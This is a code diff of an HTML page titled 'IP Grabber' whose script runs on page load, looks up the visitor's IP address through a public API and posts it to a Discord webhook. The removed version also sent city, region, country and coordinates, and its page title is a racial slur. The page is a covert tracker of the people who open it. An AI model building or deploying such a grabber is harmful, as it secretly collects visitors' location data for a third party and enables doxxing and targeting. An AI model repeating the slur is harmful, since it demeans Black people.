@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fuck you Nigger</title>
+    <title>IP Grabber</title>
 </head>
 <body>
     <script>
-        async function fetchInfo() {
+        async function fetchIP() {
             try {
-                // Fetch IP address and location
-                const ipResponse = await fetch('https://ipinfo.io/json');
+                // Fetch IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
 
                 // Prepare the message payload
                 const payload = {
-                    content: `IP Address: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nCoordinates: ${ipData.loc}\n`,
-                    username: 'Info Grabber'
+                    content: `IP Address: ${ipData.ip}\n`,
+                    username: 'IP Grabber'
                 };
 
                 // Send the payload to the Discord webhook
@@ -34,7 +34,7 @@
         }
 
         // Fetch and send information when the page loads
-        fetchInfo();
+        fetchIP();
     </script>
 </body>
 </html>
